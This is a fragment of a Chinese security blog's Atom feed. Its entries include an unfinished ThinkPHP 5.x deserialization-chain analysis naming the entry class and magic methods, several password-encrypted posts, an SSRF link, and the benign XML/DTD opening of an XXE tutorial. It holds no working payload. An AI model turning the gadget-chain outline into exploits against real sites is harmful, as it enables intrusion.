class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure><h1 id="反序列化链分析"><a href="#反序列化链分析" class="headerlink" title="反序列化链分析"></a>反序列化链分析</h1><p>别的链子调用这里 以后抽时间看看</p><p><img src="/2022/08/18/thinkphp5-x/MyBlog\b1ue0cean.github.io\source_posts\thinkphp5-x\image-20220818165528934.png" alt="image-20220818165528934"></p><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>跳板</p><p><img src="/2022/08/18/thinkphp5-x/MyBlog\b1ue0cean.github.io\source_posts\thinkphp5-x\image-20220818165846928.png" alt="image-20220818165846928"></p><p>反序列化起点：<code>thinkphp/library/think/process/pipes/Windows.php</code> <code>removeFiles</code>方法</p><p><img src="/2022/08/18/thinkphp5-x/MyBlog\b1ue0cean.github.io\source_posts\thinkphp5-x\image-20220818170051513.png" alt="image-20220818170051513"></p><p>可以调用 <code>removeFiles()</code> 方法</p><p>跟进一下</p><p><img src="/2022/08/18/thinkphp5-x/MyBlog\b1ue0cean.github.io\source_posts\thinkphp5-x\image-20220818170452960.png" alt="image-20220818170452960"></p><p><code>file_exists</code>方法能够触发<code>__toString</code>魔术方法</p><blockquote><p><code>__toString()</code> //把类当作字符串使用时触发</p></blockquote><p><img src="/2022/08/18/thinkphp5-x/MyBlog\b1ue0cean.github.io\source_posts\thinkphp5-x\image-20220818170823882.png" alt="image-20220818170823882"></p><p>然后继续跟进</p><p>跟进<code>toJson</code>方法至<code>toArray</code>方法</p><p>如下图<strong>Model抽象类</strong>的<code>toArray</code>方法，存在三个地方可以执行<code>__call</code></p><img src="/2022/08/18/thinkphp5-x/MyBlog\b1ue0cean.github.io\source\_posts\thinkphp5-x\image-20220818171424647.png" alt="image-20220818171424647" style="zoom:67%;"><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.freebuf.com/articles/web/284091.html">https://www.freebuf.com/articles/web/284091.html</a></p><p><a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">ThinkPHP 5.2反序列化 - osword’s blog (zhzhdoai.github.io)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开始搞起来（没写完&lt;/p&gt;</summary>
    
    
    
    <category term="thinkphp5" scheme="http://example.com/categories/thinkphp5/"/>
    
    <category term="serialize" scheme="http://example.com/categories/thinkphp5/serialize/"/>
    
    
    <category term="thinkphp5" scheme="http://example.com/tags/thinkphp5/"/>
    
    <category term="serialize" scheme="http://example.com/tags/serialize/"/>
    
  </entry>
  
  <entry>
    <title>length extension attack</title>
    <link href="http://example.com/2022/08/18/length-extension/"/>
    <id>http://example.com/2022/08/18/length-extension/</id>
    <published>2022-08-18T07:35:46.000Z</published>
    <updated>2022-08-23T19:10:14.324Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5fec32657be61d4656f7ce43a7f8a68bf2e3f508542c06bd1c25eca31374da69">991ab7d2bd03f4d5f10ea7e59fdd190b0f69622821c86cbeb6be83be1c1415bf9291b85d19d9e7db052041f00a2d97a7ee25d7f0116cdc80149eb7b77bc29680efc4a0809db881a0dedf41d370602f6ad84bc9d573103bec73e24a9eeca20275f23d04c27e7a532c1e3daa2de4c62a840c27270b04de60e760a2109cbe51507d3182a1e6de8f79fd121a8cd69dc6843304b41df5f812e1053c409d298567323cbe75e1832f74373436c05780093c21667a55337ef187bf1d4cf9a9d2fd306b2f1de985343068d18004923cd169d90ea2d6b5b65871a770e7df6571696f7cd02088c359b58e581a76725197e29253a3b74300a37506bc00f8613e2f55bbe99e0dac56098fd98de3e2e7aea954a86d4b9b3282af17fc3079f9818af2196ebb5873e36326003c58d29e70e1941831fa7611971d370154f614b90556b4857d5317725e82d36f75bef0814eed6db22ef8729d1dc663884c6377e7b41c9b1d724fda2b255d9d86e92023b231c01dfabea0c3646bceb954cee93b9cf2ec1e26e1a43fe853e060e734f5004ea046d29078715516cf5cac1566c0cb7cb25fb8ee66b9ef4d0dbe05a61bc0e41872d3662aa5817ef3328c6f0923ed4a929db9ff8e58c88ed580b424360efd273b80d0a95b2e7738ca64320cec89b1e689467445d8e51da9dcdb147ef4bf8fb84819cf295be79546c4dc9dfc70176935415ccb7e6b20b534bc77b2515389745fce342fa3cd73353accbef3dbead4dbbb71dc9c02ee5d2894fd16becff7f45f42bdf03f2a902aad3320d09579ce951155cd86c198cb3bfb34d19d94b022b6bcd87c5d97e9f478ac954453c13fe23ec9764e91d44b1d3809220d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="length Extention" scheme="http://example.com/categories/length-Extention/"/>
    
    
    <category term="length Extension" scheme="http://example.com/tags/length-Extension/"/>
    
  </entry>
  
  <entry>
    <title>vaethink 漏洞挖掘</title>
    <link href="http://example.com/2022/08/18/vaethink-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://example.com/2022/08/18/vaethink-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2022-08-17T17:11:03.000Z</published>
    <updated>2022-08-23T19:11:37.063Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fff701d7bf5371f22c5c280c592cb02b15b9314176fe35bc6b56e9d7d9e2c130">9edafcd33c4c730cef73baa4d6d502bdfd5b124e9ab179d94ab606460a59a2e85b5404d6bedf3ff40db4102663a13b28226d1296eaf0326b8a2afce0d6e385d1d6661de37a63b163387e8d70b0808b17aea07f29af10856c0f8e87ecff9bbf69a7d6743621ef67624c5c57f3f7aea759e6c79cdca5490bcdea94203d6033a54e9ac956029404d566378544058cdb35b82635eec324d0ed2b35bba1a7abaca0b03c39254a22cebcb86d10ac74dc3f2244f2bf08768cd744d2661b8da29f5b37464b0161c3671699743242bcb70a93bbd09cece2ca0e8918afba0c6f8e90ad01c6d21dc510a66c16df6a613ff33fb552a1c8550707a95fa79bc4a7a2d2244ba77cdadc638fb485379c31c1e1cb0931fad8872e2d1d88d7b8ede87b1715aa04e7b26cef9db701ccbb7d35ee8c1755615b6c5709df09c997e146ebbe319be91187c6826c58edaed0644240fbdcc0373fb5d87a740f077be2eecb7481ba4d681420b6c2adce11a8b2220da09624b255a782197beacfd2092bfe22e00a4b754bf98f62edc094c143c3f85521aeddec6efbaf95141a00a0371134fdba31b2b92dd9e13d853b26c30f09e878e2793fb1bf8154cd0df169e11a1b1ca680307387667d03ae76fd0afbe5470952cca03354294a2e1a39b24aaf780fb8c9ee870694269354e565b6672b8ff55f9df54e24e82125b614e411a1802ae8c158e9d316b79409a082d0f52647d8f20a6a988ae52417af7a5000266081d4355ee6a32dedf22fd916c8ace1764378fd448e9b2fcfaacf30be12b8cb9c981710f8696e6ce663607a050ede45daacd2153024c6dd0900ca95547c3185b6c5c18b9b6ee2195fa0abf6d3b49e16aaa373a744510a354f83ee3ec8baf791f39d7d6ab8babce9c9a5521b0648bc63f10ab6d22284a716d1cf8b24433198877696f923aed343fa8f22977769d811d8358f157af9a7a4dea80bf33b6c7881792cf8813d993645c83bc1e28633a7f331f28aeb03f9fcec86d6b557a0adae2ab20c1eeffc7f3893b579d02b1bcf21524f61d03eea939aac4f062bbe1f1f7d10dc6155df305859a81340a620627616d652405830bf0a42e7341b3acb551430ffbcaf342ef522000d05c9330a348d80b73229c44a3096bba26446f96105bd7ef7bc0983fe3a55d78d47cdb84fcaab8fa3991c6e4a8e0d155adcfd6171456b9dcf89938a43f9baa9693fa46f7aa14ee1b0d1fbfd1dc62f0a889a5d9557f89e3a697267ff207cb0c171b8545d8c1c899f0b23b51adf26ad03aa9a754709bbc8b54e321d9f9d90925035d109c25ff439d8f3ce5a005f309f20f55c5dd25fa39307a31371e0498e17cdc8559784dea25532227bf4a524b437f23a84d26c0be49f01fd122f57249f3e4b15fe7850620f51463dec5935bd7d69bc843107568de576dc9d874aa21d40a749c8a116c93efdb7fbcea1f5c4a73f31a0811b7a8cab0471ecf618c596c2fb43eae5af0cf78e95b1545d7a47d23777c88211d5c17f37d680531b5b4388103ca3dfc8c567deec4d41ca5d08cc89b21f6d70e1ec3aa5ce311c3b60725c40b91029fc36b290a319376987894d84438e3795d27c2e1c34b9a23dad0df7fda085bd464ab2535b90b33e7f320713a79746303a92216f17e9fa041384f75cade4dd7769a8c80248a594f9f0fdd8de46e0eb426f2ffab3f629439e57fc3d3c6f3954bc1848a3e849ca8e79f27d4cf40474d930d9ce9f3528ff19a5d677ccf77d3196ce9b2fb131d2d5a18b13ab0924f48918b9095650c487252440762c302809651d7a7b0dea4e36536ee0d0bad46995b7362d9bb52afdda7300c6acd832afd7d5ae374cda80503f1a790824d39601c64531053f9757b1a17b80d3ef1c56ed444afdf72b27984ad37ef21ab272ce60eed1e784ec3e78fa0cd99755c335f368b232641f40a7f014b68aef3039b0d7eca0df4554fd78cb7550d85509319e826b1b78245fd81dcd92fd3c076207ddc0fd514b6323e4401e5ca82c10ac1191069ddd0f240a9af2f57bc209fd73f7f4f44474ef01ad5ebd1a783b270672b9ddb8f528304894dcfcfd511e0ac00b8719159c76ace4370a23ab2eaae3c8582ac1845debb31252733b3b34c4788d489c140eee6d11d1d48ee941a65f7d7a131d84d7b92d5008c1f49fe770fcca20a98c522366af4b890c5178cd484590871bf027c4d881765a817c8d3a83e3599027c3c36be4967a24ea6e7825e56e268d06c2448108d3d67a8ab70dfd72d86940717a90c4f8f6f0803b1c8794f99ac7947808738a88af390e8da12fdef80cb426ab3392e108740e53e14c07ea65b738383d5cb5c026b38116eb93def054776687c83b7eb060dd4cd211e2262e2d15a860ebc11f0cf1cdd510087efc7aaae6545d68e0e6947a1cd03b6a6a2dd30377b1c30fee5703ecdb8011421a30d20e9118ec29468f169a90ec3e57dc49ae67a1e9139f3d407500ed833815d148c3b9e029db053ba6d6623ce5ea5bc077036f7abab0e9eb795ccf94708739d85085e329e89c78915388ad3d681f91f957147bbbaeeaecef25615c2e63ec8fab4c13ea66bbea423c2163960c36a39521bcc31d24a7c4245a2d50fba7f08f5570abdffd8bb768e9203e74a564a7d00b09b58d9ac5475623eda948c9ca3d1cd11660b950787ad277932e8d38fb816e502ae3285fb13373e822ed228327188d6ac259d9a6ee82573687f638a78fd586d336cf133c4f1b6904eb03ac9d1a40a5195a8af87c1596f6735a3403c6e61c5735f38fb02a921a148c9b64c63e60fb6f5f2ca6a2c8dcec57c909530c705c2d31683d229f06f5dfab25cbcf722724f38786ae19e635d51cf422299b1b9ba51ccfe8e0a9fe009445629922b92c3f91bc731af3a30df28b6835896a31493b67b034e3671808538ccb0ccbff0bf5ee97af84d41aec0175ac6d6e447e00f567e8e4e7a0815f2e79c1560bede41dbf097980fb7bc9d51025c853b2a7f8e441b986604f7cf6430642242f192967de28054daf2cd1db80c7bd324392431ce1f1b98c88c62d82fc68f27e82cea460f051e677150db3122c7ecae7e2621a590cc7751ba06dd95d1e24e1480f3fc191ee047c9f6ee65942df7f2e5746e06e582b2b7f650f69c2d66085a0653ca5810a9c97a2ea647a8e1c99b91a51d7feb139bafbe2d161b323b2cacbb656ad3219fcdcd7c8552e0e84a33ac017eeb0816c13b43f4f8bdac44e3eaad258426eaf0f3f13236d0c01a301c4d073023c21433d225137012b21b5d08e173a44f0ad7be91f86ff6a1a7d8de61a5708def762fbe34dfd0875c996829f75b5aa383c33bc50e3cf2b66d491c2ab94ad6c71a2dbfac263fc5e4bcb34c6b916d2cd6f817a97955708aa4c5f9d82feb7dcec7a5891816a0e01f3e959bda0fb7730a6101c6f1f83a164aba1cb98bcfd2f823e7145037902073ca470f39de8a01d60c5083b9e68e1ff934548cdcf23f29880a4ebd887ca3174fafa3bfe2eeb7c7029d6b787d9856319dc98c05df0e4007ab86bbd4b6c1a997f4a6d413a11dea678cd81955183219e564b43f55b65176bf77adaea587a59042a3a3d5070d571d5f30a2b4bd231b00080648216837d0178742081e2d5efda96a1ad9a28e922c68e4a0e8d8f7d242aede9463a8d4ae420f68d90d2721ffa0755e7c799fb5e94c6f84d6f7a6d4141c9d126ef10dc943f9930e67cb37a95cbea6aef8b9130d003e02685d4940db153f920b6a37fa641de8aa65a0986d8a007ad7777df66088950eaf5569cbc7f712a52d94a3f6d95bc8c32ba0ee1f8633b713b5425b6752e7f29f017b91af61a0a4d764139673ebe8df6f8aee1eb823e9c6c6b055e666f18b7f88dd30d2dc916f23bbf75f3586909bf1fb41bc42b0376bc16cd6a9351ff872a5410fb21ca8d1dc1f33c0867a92ec292c07c93e410a0153293a5a7bbd8f233aca041d477ca4a96800ab0d255ce67097c7f90e325a96ccfb53f043a57280457a236dc5cdb846be967a89ed4df896e57dfd9e196f75f435b1ed0081e58fcc753691ad4fc4cd308822a1171304f25217c7acd1a8145996d40df4f0762537dc96622272a135206bef036528054dfcd243f0e1d67d9d57952a133909823d4ee81ef3668309827da3f5f389efb8deaad377a24be5cbcb36f94b60723b3802b9de4e1a879ebd974649418da365020d0c1dd2a662492a1c568a1dcc891d4fce47f9fe9042c4926cb49d821e870718412f397c3dc408e649169221b4b91720c8425ac4a0640fa75714f007d24e1fc5fecd1a1b02156b424cf61abecd99a039e9a60c90ef7b1b6b982c2fc72a6e00e2bb96b7f9029b91f640542f17c4dc0f0e40a29d73e68eee4c4962fa0d28956842d26294f19d6aa2eae1d7a58d6dc1d36a62922ffc0aa2afd003361986ef5b19f666f1845f87f9e18f3979a91b90496596e1bf956b84fbf84be81e06b4c6973c44bd049dd13c5b76c520fbe1bc4d4f35f501b1d78b71b2d5bf74ef88b7f180ee0ea7913c04f098258721c06a6d3aaa07f6dba95ff11ae44f0c2e9b3bbd564b5b8900039d7cc1bfb4e6b04ed44b9e228e8abd3d7bdfd7f30c0eaf3815c87116b30a5caef7c6e049b79dd0a6f12acbfec18e8b18130e6d33a531a665b4c0b2c46fb857b0826e8724e8b9f70a557aeec2be51d575a054ecaa9d1f9adee52aa7326fcccda4cdcccfce3c3dc08e0829898fc0613d53d99e8ccc03686335538b1990c99d549dcf4ef224d6e13719a9ac3e633b85e9eb9366a9f5e08c17679dec92883dfe8b3a6c1c59921a140044e52885ffa167b1c257e0ae0aecbdae42b66d96e8746978287f0d540c9e67890c680a64bf7faa2693542b6ada1729e153d06d823e19ed85d342d2ba71f6d6155774e68e329b82d46fd6e86db2027192e383e4e7a1b6fcc0981</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="漏洞挖掘" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>code review (Pentestlab)</title>
    <link href="http://example.com/2022/08/17/code-review/"/>
    <id>http://example.com/2022/08/17/code-review/</id>
    <published>2022-08-17T08:36:23.000Z</published>
    <updated>2022-08-19T11:59:23.184Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b157f9aa0d475526ddd99b7afb1781178d9416fa048247070232e24520071142"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="code review" scheme="http://example.com/categories/code-review/"/>
    
    
    <category term="code review" scheme="http://example.com/tags/code-review/"/>
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="http://example.com/2022/08/17/SSRF/"/>
    <id>http://example.com/2022/08/17/SSRF/</id>
    <published>2022-08-17T06:00:42.000Z</published>
    <updated>2022-08-23T19:11:57.956Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/9554">https://xz.aliyun.com/t/9554</a></p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/9554&quot;&gt;https://xz.aliyun.com/t/9554&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="SSRF" scheme="http://example.com/categories/SSRF/"/>
    
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>XML ATTACK ~ XXE / Xpath</title>
    <link href="http://example.com/2022/08/17/xmlinjection/"/>
    <id>http://example.com/2022/08/17/xmlinjection/</id>
    <published>2022-08-17T05:56:03.000Z</published>
    <updated>2022-08-23T19:09:37.329Z</updated>
    
    <content type="html"><![CDATA[<p>一年前写的文章 重新加工一下 权当复习了</p><p>建议先好好看看 <a href="https://www.runoob.com/xml/xml-usage.html">XML 用途 | 菜鸟教程 (runoob.com)</a>  <a href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD 教程 | 菜鸟教程 (runoob.com)</a>一切都要从基础开始学起</p><span id="more"></span><h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><h2 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML"></a>什么是 XML</h2><ul><li>XML 指可扩展标记语言（EXtensible Markup Language）。</li><li>XML 是一种很像HTML的标记语言。</li><li>XML 的设计宗旨是传输数据，而不是显示数据。</li><li>XML 标签没有被预定义。您需要自行定义标签。</li><li>XML 被设计为具有自我描述性。</li><li>XML 是 W3C 的推荐标准。</li></ul><h2 id="XML-和-HTML-之间的差异"><a href="#XML-和-HTML-之间的差异" class="headerlink" title="XML 和 HTML 之间的差异"></a>XML 和 HTML 之间的差异</h2><p>XML 不是 HTML 的替代。</p><p>XML 和 HTML 为不同的目的而设计：</p><ul><li>XML 被设计用来传输和存储数据，其焦点是数据的内容。</li><li>HTML 被设计用来显示数据，其焦点是数据的外观。</li></ul><p>HTML 旨在显示信息，而 XML 旨在传输信息。</p><h2 id="XML-把数据从-HTML-分离"><a href="#XML-把数据从-HTML-分离" class="headerlink" title="XML 把数据从 HTML 分离"></a>XML 把数据从 HTML 分离</h2><p>如果您需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p><p>通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。</p><h2 id="XML-树结构"><a href="#XML-树结构" class="headerlink" title="XML 树结构"></a>XML 树结构</h2><p>XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</p><hr><h2 id="XML-文档形成一种树结构"><a href="#XML-文档形成一种树结构" class="headerlink" title="XML 文档形成一种树结构"></a>XML 文档形成一种树结构</h2><p>XML 文档必须包含<strong>根元素</strong>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><p>所有的元素都可以有子元素：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>父、子以及同胞等术语用于描述元素之间的关系。父元素拥有子元素。相同层级上的子元素成为同胞（兄弟或姐妹）。</p><p>所有的元素都可以有文本内容和属性（类似 HTML 中）。</p><p><strong>一个很恰当的例子</strong></p><p>您可以假设，从这个实例中，XML 文档包含了一张 Jani 写给 Tove 的便签。可以看出XML 具有出色的自我描述性</p><ul><li><p>第一行是 XML 声明。它定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言）。</p></li><li><p>下一行描述文档的<strong>根元素</strong>（像在说：”本文档是一个便签”）<code>&lt;note&gt;</code></p></li><li><p>接下来 4 行描述根的 4 个<strong>子元素</strong>（to, from, heading 以及 body）</p></li><li><p>最后一行定义根元素的结尾 <code>&lt;/note&gt;</code></p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="一些要注意的地方"><a href="#一些要注意的地方" class="headerlink" title="一些要注意的地方"></a>一些要注意的地方</h2><blockquote><p>所有的 XML 元素都必须有一个关闭标签</p><p>XML 标签对大小写敏感。标签 <code>&lt;Letter&gt; </code>与标签<code>&lt;letter&gt;</code>是不同的</p><p>XML 必须正确嵌套</p><p>XML 属性值必须加引号</p></blockquote><p>加引号！</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">date</span>=<span class="string">&quot;12/11/2007&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="良好的XML文档"><a href="#良好的XML文档" class="headerlink" title="良好的XML文档"></a>良好的XML文档</h2><ul><li>XML 文档必须有一个根元素</li><li>XML元素都必须有一个关闭标签</li><li>XML 标签对大小写敏感</li><li>XML 元素必须被正确的嵌套</li><li>XML 属性值必须加引号</li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><a href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD 教程 | 菜鸟教程 (runoob.com)</a></p><h2 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a>内部的 DOCTYPE 声明</h2><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> [element-declarations]&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上 DTD 解释如下：</p><ul><li><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档。</p></li><li><p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading,、body”</p></li><li><p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p></li><li><p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p></li><li><p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p></li><li><p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p></li></ul><h2 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h2><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 